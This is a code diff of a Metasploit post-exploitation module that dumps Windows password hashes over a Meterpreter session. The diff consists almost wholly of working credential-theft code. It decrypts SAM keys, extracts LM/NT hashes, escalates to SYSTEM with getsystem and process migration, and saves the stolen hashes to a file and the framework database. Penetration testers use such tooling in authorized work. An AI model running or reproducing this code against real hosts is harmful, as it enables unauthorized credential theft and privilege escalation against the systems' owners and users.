@@ -261,44 +261,45 @@ class Metasploit3 < Msf::Post
 	end
 	#-------------------------------------------------------------------------------
     
-	def read_hashdump
+		def read_hashdump
 		collected_hashes = ""
 		begin
-            
+
 			print_status("\tObtaining the boot key...")
 			bootkey  = capture_boot_key
-            
+
 			print_status("\tCalculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
 			hbootkey = capture_hboot_key(bootkey)
-            
+
 			print_status("\tObtaining the user list and keys...")
 			users    = capture_user_keys
-            
+
 			print_status("\tDecrypting user keys...")
 			users    = decrypt_user_keys(hbootkey, users)
-            
+
 			print_status("\tDumping password hashes...")
-            
+
 			users.keys.sort{|a,b| a<=>b}.each do |rid|
 				# next if guest account or support account
 				next if rid == 501 or rid == 1001
 				collected_hashes << "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::\n"
+				print_good("#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::\n")
 				session.framework.db.report_auth_info(
-                                                      :host  => session.sock.peerhost,
-                                                      :port  => @smb_port,
-                                                      :sname => 'smb',
-                                                      :user  => users[rid][:Name],
-                                                      :pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
-                                                      :type  => "smb_hash"
-                                                      )
+					:host  => session.sock.peerhost,
+					:port  => @smb_port,
+					:sname => 'smb',
+					:user  => users[rid][:Name],
+					:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
+					:type  => "smb_hash"
+				)
 			end
-            
-            rescue ::Interrupt
+
+		rescue ::Interrupt
 			raise $!
-            rescue ::Rex::Post::Meterpreter::RequestError => e
+		rescue ::Rex::Post::Meterpreter::RequestError => e
 			print_error("Meterpreter Exception: #{e.class} #{e}")
 			print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
-            rescue ::Exception => e
+		rescue ::Exception => e
 			print_error("Error: #{e.class} #{e} #{e.backtrace}")
 		end
 		return collected_hashes
@@ -312,17 +313,34 @@ class Metasploit3 < Msf::Post
 		# dump hashes
 		session.priv.sam_hashes.each do |h|
 			returned_hash = h.to_s.split(":")
+			if returned_hash[1] == "j"
+				returned_hash.delete_at(1)
+			end
 			rid =  returned_hash[1].to_i
+
+			# Skip the Guest Account
 			next if rid == 501 or rid == 1001
-			collected_hashes << h.to_s + "\n"
-			session.framework.db.report_auth_info(
-                                                  :host  => session.sock.peerhost,
-                                                  :port  => @smb_port,
-                                                  :sname => 'smb',
-                                                  :user  => returned_hash[0].gsub(/[\x80-\xff]/,''),
-                                                  :pass  => returned_hash[2] +":"+ returned_hash[3],
-                                                  :type  => "smb_hash"
-                                                  )
+
+			# skip if it returns nil for an entry
+			next if h == nil
+			begin
+				user = returned_hash[0].scan(/^[a-zA-Z0-9\-$.]*/).join.gsub(/\.$/,"")
+				lmhash = returned_hash[2].scan(/[a-f0-9]*/).join
+				next if lmhash == nil
+				hash_entry = "#{user}:#{rid}:#{lmhash}:#{returned_hash[3]}"
+				collected_hashes << hash_entry
+				print_good(hash_entry)
+				session.framework.db.report_auth_info(
+					:host  => session.sock.peerhost,
+					:port  => @smb_port,
+					:sname => 'smb',
+					:user  => user,
+					:pass  => "#{lmhash}:#{returned_hash[3]}",
+					:type  => "smb_hash"
+				)
+			rescue
+				next
+			end
 		end
 		return collected_hashes
 	end
@@ -370,7 +388,7 @@ class Metasploit3 < Msf::Post
     
 	#-------------------------------------------------------------------------------
     
-	def smart_hash_dump(migrate_system, pwdfile)
+		def smart_hash_dump(migrate_system, pwdfile)
 		domain_controler = is_dc?
 		if not is_uac_enabled? or is_admin?
 			print_status("Dumping password hashes...")
@@ -379,46 +397,35 @@ class Metasploit3 < Msf::Post
 				# For DC's the registry read method does not work.
 				if domain_controler
 					begin
-						inject_hashdump.each_line do |h|
-							print_good("\t#{h}".chomp)
-							file_local_write(pwdfile,h.chomp)
-						end
-                        rescue::Exception => e
+						file_local_write(pwdfile,inject_hashdump)
+					rescue::Exception => e
 						print_error("Failed to dump hashes as SYSTEM, trying to migrate to another process")
-						print_error(e)
+						puts(e)
 						if sysinfo['OS'] =~ /(Windows 2008)/i
 							move_to_sys
-                            
-							inject_hashdump.each_line do |h|
-								print_good("\t#{h}".chomp)
-								file_local_write(pwdfile,h.chomp)
-							end
-                            
-                            else
+							file_local_write(pwdfile,inject_hashdump)
+						else
 							print_error("Could not get Domain Hashes!")
 						end
 					end
-                    
+
 					# Check if not DC
-                    else
+				else
 					print_status "Running as SYSTEM extracting hashes from registry"
 					read_hashdump.each_line do |h|
 						print_good("\t#{h.chomp}")
 						file_local_write(pwdfile,h.chomp)
 					end
 				end
-                
+
 				# Check if not running as SYSTEM
-                else
-                
+			else
+
 				# Check if Domain Controller
 				if domain_controler
 					begin
-						inject_hashdump.each_line do |h|
-							print_good("\t#{h}")
-							file_local_write(pwdfile,h.chomp)
-						end
-                        rescue
+						file_local_write(pwdfile,inject_hashdump)
+					rescue
 						if migrate_system
 							print_status("Trying to get SYSTEM Privilege")
 							results = session.priv.getsystem
@@ -430,19 +437,16 @@ class Metasploit3 < Msf::Post
 									# inject and dump the hashes.
 									move_to_sys
 								end
-								inject_hashdump.each_line do |h|
-									print_good("\t#{h}".chomp)
-									file_local_write(pwdfile,h.chomp)
-								end
+								file_local_write(pwdfile,inject_hashdump)
 							else
 								print_error("Could not obtain System Privileges")
 							end
-                            else
+						else
 							print_error("Could not get Domain Hashes!")
 						end
-                        
+
 					end
-                    elsif sysinfo['OS'] =~ /(Windows 7|2008|Vista)/i
+				elsif sysinfo['OS'] =~ /(Windows 7|2008|Vista)/i
 					if migrate_system
 						print_status("Trying to get SYSTEM Privilege")
 						results = session.priv.getsystem
@@ -455,12 +459,13 @@ class Metasploit3 < Msf::Post
 						else
 							print_error("Could not obtain System Privileges")
 						end
-                        else
+					else
 						print_error("On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes")
 						print_error("Try setting GETSYSTEM to true.")
 					end
-                    
-                    else
+
+				else
+					puts migrate_system
 					if migrate_system
 						print_status("Trying to get SYSTEM Privilege")
 						results = session.priv.getsystem
@@ -473,17 +478,14 @@ class Metasploit3 < Msf::Post
 						else
 							print_error("Could not obtain System Privileges")
 						end
-                        else
-						inject_hashdump.each_line do |h|
-							print_good("\t#{h.chomp}")
-							file_local_write(pwdfile,h.chomp)
-						end
+					else
+						file_local_write(pwdfile,inject_hashdump)
 					end
-                    
+
 				end
-                
+
 			end
-            else
+		else
 			print_error("Insuficient privileges to dump hashes!")
 		end
 	end
